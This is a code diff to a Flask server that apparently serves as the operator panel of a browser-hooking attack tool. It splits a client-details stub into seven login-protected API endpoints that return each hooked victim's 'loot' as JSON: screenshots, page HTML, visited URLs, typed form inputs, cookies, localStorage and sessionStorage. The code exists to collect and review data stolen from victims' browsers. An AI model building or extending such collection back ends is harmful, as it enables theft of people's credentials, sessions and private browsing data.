@@ -602,11 +602,10 @@ def getClients():
 
 
 
-# Get client details (it's selected in UI)
-@app.route('/api/clientDetails/<id>', methods=['GET'])
+@app.route('/api/clientScreenshots/<id>', methods=['GET'])
 @login_required
-def getClientDetails(id):
-    print("** Got client details request for client " + id)
+def getClientScreenshots(id):
+    print("** Got client screenshots request for client " + id)
 
 
     # Let's find all our loot in the database
@@ -616,23 +615,141 @@ def getClientDetails(id):
 
     print("Digging up look for client: " + clientName)
 
-    screenshots    = Screenshot.query.filter_by(clientID=clientName)
-    htmlCode       = HtmlCode.query.filter_by(clientID=clientName)
-    urlsVisited    = UrlVisited.query.filter_by(clientID=clientName)
-    userInputs     = UserInput.query.filter_by(clientID=clientName)
-    cookies        = Cookie.query.filter_by(clientID=clientName)
-    localStorage   = LocalStorage.query.filter_by(clientID=clientName)
-    sessionStorage = SessionStorage.query.filter_by(clientID=clientName)
+    screenshots = Screenshot.query.filter_by(clientID=clientName)
 
+    screenshotData = [{'id':screenshot.id, 'timeStamp':screenshot.timeStamp, 'fileName':screenshot.fileName} for screenshot in screenshots]
     
 
-
-    # client = Client.query.filter_by(nickname=identifier).first()
-
-    return "ok", 200
+    return jsonify(screenshotData)
 
 
 
+@app.route('/api/clientHtml/<id>', methods=['GET'])
+@login_required
+def getClientHtml(id):
+    print("** Got client html request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    htmlCode = HtmlCode.query.filter_by(clientID=clientName)
+
+    htmlData = [{'id':html.id, 'timeStamp':html.timeStamp, 'url':html.url, 'code':html.code} for html in htmlCode]
+    
+
+    return jsonify(htmlData)
+
+
+
+@app.route('/api/clientUrl/<id>', methods=['GET'])
+@login_required
+def getClientUrls(id):
+    print("** Got client URL request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    urlsVisited = UrlVisited.query.filter_by(clientID=clientName)
+
+    urlData = [{'id':urlVisited.id, 'timeStamp':urlVisited.timeStamp, 'url':urlVisited.url} for urlVisited in urlsVisited]
+    
+
+    return jsonify(urlData)
+
+
+
+@app.route('/api/clientUserInputs/<id>', methods=['GET'])
+@login_required
+def getClientUserInputs(id):
+    print("** Got client user inputs request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    userInputs = UserInput.query.filter_by(clientID=clientName)
+
+    userInputData = [{'id':userInput.id, 'timeStamp':userInput.timeStamp, 'inputName':userInput.inputName, 'inputValue':userInput.inputValue} for userInput in userInputs]
+    
+
+    return jsonify(userInputData)
+
+
+
+@app.route('/api/clientCookies/<id>', methods=['GET'])
+@login_required
+def getClientCookies(id):
+    print("** Got client cookies request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    cookies = Cookie.query.filter_by(clientID=clientName)
+
+    cookieData = [{'id':cookie.id, 'timeStamp':cookie.timeStamp, 'cookieName':cookie.cookieName, 'cookieValue':cookie.cookieValue} for cookie in cookies]
+    
+
+    return jsonify(cookieData)
+
+
+
+
+
+@app.route('/api/clientLocalStorage/<id>', methods=['GET'])
+@login_required
+def getClientLocalStorage(id):
+    print("** Got client localStorage request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    localStorage = LocalStorage.query.filter_by(clientID=clientName)
+    
+    localStorageData = [{'id':storage.id, 'timeStamp':storage.timeStamp, 'localStorageKey':storage.key, 'localStorageValue':storage.value} for storage in localStorage]
+    
+
+    return jsonify(localStorageData)
+
+
+
+
+@app.route('/api/clientSessionStorage/<id>', methods=['GET'])
+@login_required
+def getClientSesssionStorage(id):
+    print("** Got client sessionStorage request for client " + id)
+
+    # Let's find all our loot in the database
+    client = Client.query.filter_by(id=id).first()
+
+    clientName = client.nickname;
+
+    print("Digging up look for client: " + clientName)
+
+    sessionStorage = SessionStorage.query.filter_by(clientID=clientName)
+    
+    sessionStorageData = [{'id':storage.id, 'timeStamp':storage.timeStamp, 'sessionStorageKey':storage.key, 'sessionStorageValue':storage.value} for storage in sessionStorage]
+    
+
+    return jsonify(sessionStorageData)
 
 
 #**************************************************************************
